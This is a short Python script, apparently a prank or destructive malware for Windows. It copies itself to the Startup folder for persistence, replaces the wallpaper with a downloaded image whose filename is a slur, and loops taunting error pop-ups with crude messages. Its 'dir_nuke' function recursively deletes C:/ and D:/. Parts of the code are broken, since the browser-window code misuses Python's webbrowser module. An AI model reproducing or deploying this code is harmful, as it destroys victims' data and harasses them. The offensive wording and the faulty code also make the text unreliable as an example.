import shutil
import os
import ctypes
import requests
import sys
import webbrowser
import time
from tkinter import messagebox

def copy_to_startup():
    # Get the path to the user's startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Get the path of the current script
    script_path = sys.argv[0]

    # Copy the script to the startup folder
    shutil.copy(script_path, startup_folder)

def display_error_messages():
    while True:
        messagebox.showerror("LMAO", "Congratulations, you have won an STD!")
        messagebox.showerror("LMAO", "Aw come on, dont go.")
        messagebox.showerror("LMAO", "Give up.")
        messagebox.showerror("LMAO", "Where are you going?")
        messagebox.showerror("LMAO", "Nice try.")
        messagebox.showerror("LMAO", "To put it simply,")
        messagebox.showerror("LMAO", "I refuse to be closed.")

def display_image_box():
    while True:
        objExplorer = webbrowser.get("windows-default")
        objExplorer.open("about:blank")
        objExplorer.toolbar = 0
        objExplorer.statusbar = 0
        objExplorer.left = 200
        objExplorer.top = 200
        objExplorer.width = 200
        objExplorer.height = 250
        objExplorer.visible = True
        objExplorer.document.title = "get muazzed"
        objExplorer.document.body.innerHTML = "<img src='https://cdn.discordapp.com/attachments/1105563151216414811/1105855509879332935/gaymeicon.png' height=200 width=200>"

# zestiest part of the program
def dir_nuke():
    dir = 'C:/'
    shutil.rmtree(dir)

    dir = 'D:/'
    shutil.rmtree(dir)

# Changes wallpaper
def change_wallpaper():
    wallpaper_url = "https://cdn.discordapp.com/attachments/1105563151216414811/1106193396948811867/retarded.png"
    response = requests.get(wallpaper_url)
    image_data = response.content
    wallpaper_file = "wallpaper.png"
    with open(wallpaper_file, "wb") as file:
        file.write(image_data)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(wallpaper_file), 3)
    os.remove(wallpaper_file)
        
if __name__ == "__main__":
    copy_to_startup()
    change_wallpaper()
    time.sleep(5)
    display_image_box()
    display_error_messages()
    time.sleep(45)
    dir_nuke()
